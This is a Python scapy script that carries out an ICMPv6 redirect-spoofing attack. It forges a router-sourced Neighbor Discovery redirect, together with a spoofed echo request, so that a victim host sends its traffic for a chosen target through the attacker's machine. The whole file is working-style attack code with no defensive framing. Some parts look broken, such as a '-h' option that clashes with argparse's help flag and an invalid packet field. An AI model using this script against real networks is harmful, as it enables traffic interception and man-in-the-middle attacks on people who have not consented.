import argparse
import os
import scapy.all as sp
import scapy.layers.inet6 as inet6

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--iface')
parser.add_argument('-I', '--ip')
parser.add_argument('-M', '--mac')
parser.add_argument('-h', '--hlim', type=int, default=64)
parser.add_argument('victim')
parser.add_argument('target')
parser.add_argument('router')
args = parser.parse_args()
iface = args.iface
ip = args.ip
mac = args.mac
hlim = args.hlim
victim = args.victim
target = args.target
router = args.router

if iface:
    sp.conf.iface = iface

ip = ip or sp.conf.iface.ips[6][-1]
mac = mac or sp.getmacbyip6(ip)
victim_mac = sp.getmacbyip6(victim)
router_mac = sp.getmacbyip6(router)

pid = os.getpid()
eid = (pid >> 16) & 0xffff
seq = pid & 0xffff

p = sp.Ether(src=router_mac, dst=victim_mac) / \
    inet6.IPv6(src=target, dst=victim) / \
    inet6.ICMPv6EchoRequest(id=eid, seq=seq)
sp.sendp(p, verbose=0)

pe = inet6.IPv6(src=victim, target=target, hlim=hlim) / \
    inet6.ICMPv6EchoReply(id=eid, seq=seq)
p = sp.Ether(src=router_mac, dst=victim_mac) / \
    inet6.IPv6(src=router, dst=victim) / \
    inet6.ICMPv6ND_Redirect(tgt=target, dst=ip) / \
    inet6.ICMPv6NDOptDstLLAddr(lladdr=mac) / \
    inet6.ICMPv6NDOptRedirectedHdr(pkt=pe)
sp.sendp(p)
